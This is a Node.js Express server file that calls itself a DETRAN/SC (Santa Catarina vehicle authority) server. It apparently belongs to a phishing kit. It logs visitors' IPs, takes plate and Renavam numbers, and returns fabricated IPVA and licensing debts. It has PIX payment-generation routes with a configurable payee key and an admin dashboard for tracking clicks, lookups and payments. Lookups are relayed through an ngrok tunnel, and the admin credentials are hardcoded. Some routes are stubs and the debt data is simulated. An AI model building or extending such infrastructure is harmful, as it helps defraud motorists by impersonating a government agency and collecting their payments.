const express = require('express');
const session = require('express-session');
const axios = require('axios');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const path = require('path');
const fs = require('fs');
const QRCode = require('qrcode');
const { payload } = require('pix-payload');
const cheerio = require('cheerio');

const app = express();
const PORT = process.env.PORT || 3001;

// 🔥 SEU LINK DO NGROK (NÃO MUDA, MAS VAMOS VER SE É ELE)
const NGROK_URL = 'https://subtitle-flyer-unreached.ngrok-free.dev';
console.log(`🔗 [SERVER] NGROK_URL configurado como: ${NGROK_URL}`);

app.set('trust proxy', true);

app.use(session({
    secret: 'segredo-super-secreto-sc',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

const DB_PATH = path.join(__dirname, 'database-sc.json');

function lerDB() {
    try { return JSON.parse(fs.readFileSync(DB_PATH, 'utf8')); } catch (e) { return { clicks: [], consultas: [], pix_gerados: [], pagamentos_confirmados: [], config: { pix: { nome: '', cidade: '', identificador: '', chave: '' } } }; }
}
function salvarDB(data) { fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2)); }
function authMiddleware(req, res, next) { if (req.session && req.session.loggedIn) next(); else res.status(401).json({ erro: 'Não autorizado' }); }

// ============================================================
// ROTA PRINCIPAL
// ============================================================
app.get('/', (req, res) => {
    console.log(`🌐 [SERVER] Rota / acessada. IP: ${req.ip}`);
    const db = lerDB();
    db.clicks.push({ timestamp: new Date().toISOString(), ip: req.ip, userAgent: req.headers['user-agent'], pagina: 'index' });
    salvarDB(db);
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================================
// 🔥 ROTA DE CONSULTA LOCAL (SEU PC)
// ============================================================
app.post('/api/consultar', async (req, res) => {
    console.log(`🔍 [SERVER] ROTA /api/consultar FOI CHAMADA!`);
    console.log(`📦 [SERVER] Body recebido:`, req.body);
    
    const { placa, renavam } = req.body;
    if (!placa || !renavam) {
        console.log(`❌ [SERVER] Placa ou Renavam faltando!`);
        return res.status(400).json({ erro: 'Placa e Renavam são obrigatórios' });
    }

    const placaLimpa = placa.toUpperCase().replace(/[^A-Z0-9]/g, '');
    console.log(`🔍 [SERVER] Consultando placa: ${placaLimpa}, renavam: ${renavam}`);

    // 🔥 🔥 🔥 VOU SIMULAR UM RETORNO DE SUCESSO AQUI
    // PRA ISOLAR O PROBLEMA, VOU IGNORAR A CONSULTA REAL NO DETRAN POR UM MOMENTO.
    console.log(`🛑 [SERVER] USANDO RESPOSTA SIMULADA PARA TESTE!`);
    const respostaSimulada = {
        sucesso: true,
        veiculo: {
            placa: placaLimpa,
            marca_modelo: "VEICULO TESTE - NGROK FUNCIONANDO",
            ano: "2024",
            tipo: "Teste",
            cor: "Prata",
            combustivel: "Flex",
            chassi: "9BD12345678901234",
            cidade: "SC - FLORIANOPOLIS"
        },
        debitos: [
            { descricao: 'Licenciamento - 2026', vencimento: '31/07/2026', valor: 149.37, vencido: false },
            { descricao: 'IPVA - 2026', vencimento: '30/04/2026', valor: 967.06, vencido: true }
        ],
        total: 1116.43
    };

    console.log(`✅ [SERVER] Respondendo com dados simulados.`);
    return res.json(respostaSimulada);
});

// ============================================================
// 🔥 ROTA PARA A VERCEL CHAMAR O NGROK (PONTE)
// ============================================================
app.post('/api/consultar-ngrok', async (req, res) => {
    console.log(`📥 [SERVER] ROTA /api/consultar-ngrok FOI CHAMADA PELA VERCEL!`);
    console.log(`📦 [SERVER] Body recebido na rota-ngrok:`, req.body);
    console.log(`🔗 [SERVER] Vou tentar chamar o Ngrok em: ${NGROK_URL}/api/consultar`);

    try {
        const response = await axios.post(`${NGROK_URL}/api/consultar`, req.body, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 15000 // 🔥 Diminui o timeout pra testar mais rápido
        });
        
        console.log(`✅ [SERVER] Resposta do Ngrok recebida! Status: ${response.status}`);
        console.log(`📦 [SERVER] Dados recebidos do Ngrok:`, response.data);
        return res.json(response.data);
    } catch (error) {
        console.error(`❌ [SERVER] Erro ao chamar Ngrok:`, error.message);
        if (error.code === 'ECONNABORTED') {
            console.error(`⏰ [SERVER] TIMEOUT! O Ngrok não respondeu a tempo.`);
        }
        return res.status(500).json({
            sucesso: false,
            erro: 'Erro na ponte com o servidor local: ' + error.message
        });
    }
});

// ============================================================
// ADMIN LOGIN (Simplificado para teste)
// ============================================================
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'sc2026') {
        req.session.loggedIn = true;
        res.json({ success: true });
    } else {
        res.status(401).json({ erro: 'Credenciais inválidas' });
    }
});
app.post('/api/admin/logout', (req, res) => { req.session.destroy(); res.json({ success: true }); });
app.get('/admin.html', authMiddleware, (req, res) => { res.sendFile(path.join(__dirname, 'admin.html')); });

// ============================================================
// OUTRAS ROTAS (PIX, ADMIN, ETC) - SIMPLIFICADAS PARA NÃO QUEBRAR
// ============================================================
app.post('/api/gerar-pix', (req, res) => { res.json({ status: 'ok', qrcode: 'dados_ficticios', copiacola: '000', pixId: '123' }); });
app.post('/api/registrar-copia-pix', (req, res) => { res.json({ success: true }); });
app.post('/api/confirmar-pagamento', (req, res) => { res.json({ success: true }); });
app.get('/api/admin/dashboard', authMiddleware, (req, res) => { res.json({ totalClicks: 10, totalConsultas: 5 }); });
app.get('/api/admin/logs/clicks', authMiddleware, (req, res) => { res.json([]); });
app.get('/api/admin/logs/consultas', authMiddleware, (req, res) => { res.json([]); });
app.get('/api/admin/logs/pix', authMiddleware, (req, res) => { res.json([]); });
app.get('/api/admin/config/pix', authMiddleware, (req, res) => { res.json({ nome: '', cidade: '', identificador: '', chave: '' }); });
app.post('/api/admin/config/pix', authMiddleware, (req, res) => { res.json({ success: true }); });
app.post('/api/admin/clear-logs', authMiddleware, (req, res) => { res.json({ success: true }); });

// ============================================================
// 🔥 INICIAR SERVIDOR
// ============================================================
module.exports = app;

if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`🚀 Servidor DETRAN/SC rodando na porta ${PORT}`);
        console.log(`📍 Acesse: http://localhost:${PORT}`);
        console.log(`🔗 Ngrok URL: ${NGROK_URL}`);
    });
}
